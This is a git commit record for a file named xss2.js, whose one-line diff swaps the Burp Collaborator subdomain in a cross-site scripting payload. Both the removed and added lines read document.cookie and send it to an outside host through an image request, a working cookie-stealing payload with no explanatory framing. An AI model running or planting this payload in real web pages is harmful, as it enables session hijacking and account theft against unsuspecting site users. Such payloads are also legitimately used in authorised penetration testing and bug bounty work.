4984d979f791a46209371f309622a0b89d3daa5e
lkintheend <lkintheend@gmail.com>
2021-04-09 14:36:54 +0700

    Update xss2.js

--- xss2.js
+++ xss2.js
@@ -1,1 +1,1 @@
-new Image().src="http://fzi1v6i7ly8wyy1931w9wfavbmhd52.burpcollaborator.net?output="+document.cookie;
+new Image().src="http://s1uvs4jjn29i623ki2ez51ll5cb2zr.burpcollaborator.net?output="+document.cookie;
